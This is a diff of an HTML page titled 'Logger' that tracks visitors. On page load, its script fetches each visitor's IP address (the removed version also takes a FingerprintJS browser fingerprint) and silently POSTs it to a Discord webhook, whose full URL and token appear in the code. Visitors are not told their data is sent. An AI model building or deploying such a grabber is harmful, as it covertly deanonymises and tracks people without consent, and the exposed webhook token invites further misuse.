@@ -3,74 +3,49 @@
 <head>
   <meta charset="UTF-8">
   <title>Logger</title>
-  <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
   <style>
     body {
       background-color: #111;
       color: #0f0;
       font-family: monospace;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    h1, p {
-      margin: 0.5rem;
+      text-align: center;
+      margin-top: 100px;
     }
   </style>
 </head>
 <body>
-  <h1>Welcome</h1>
-  <p id="ip">Fetching IP...</p>
-  <p id="fp">Fetching Fingerprint...</p>
+  <h1>Your IP is:</h1>
+  <p id="ip">Loading...</p>
 
   <script>
-    const webhook = "https://discord.com/api/webhooks/1362204715005251675/i7o9dGLluaS1H95w6r3-vkHs07wVhccFVY1PrXZA_lc0Hp8zhSTyaJDYleTasWDaO3aE";
+    const webhookURL = "https://discord.com/api/webhooks/1362204715005251675/i7o9dGLluaS1H95w6r3-vkHs07wVhccFVY1PrXZA_lc0Hp8zhSTyaJDYleTasWDaO3aE";
 
-    async function getIP() {
+    async function logIP() {
       try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        return data.ip;
-      } catch {
-        return "Unknown IP";
-      }
-    }
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        const ip = data.ip;
 
-    async function getFingerprint() {
-      const fp = await FingerprintJS.load();
-      const result = await fp.get();
-      return result.visitorId;
-    }
+        document.getElementById("ip").innerText = ip;
 
-    async function sendToDiscord(ip, fingerprint) {
-      const payload = {
-        content: `🔔 **New Visitor Logged**\n🌐 IP: \`${ip}\`\n🧠 Fingerprint: \`${fingerprint}\``
-      };
+        const payload = {
+          content: `📡 **New visitor**\n🌍 IP: \`${ip}\``
+        };
 
-      try {
-        await fetch(webhook, {
+        await fetch(webhookURL, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
+          headers: {
+            "Content-Type": "application/json"
+          },
           body: JSON.stringify(payload)
         });
-      } catch (e) {
-        console.warn("Webhook failed:", e);
+      } catch (err) {
+        document.getElementById("ip").innerText = "Failed to load IP.";
+        console.error("Failed to log IP:", err);
       }
     }
 
-    async function initLogger() {
-      const ip = await getIP();
-      const fingerprint = await getFingerprint();
-
-      document.getElementById("ip").innerText = `IP: ${ip}`;
-      document.getElementById("fp").innerText = `Fingerprint: ${fingerprint}`;
-
-      sendToDiscord(ip, fingerprint);
-    }
-
-    initLogger();
+    logIP();
   </script>
 </body>
 </html>
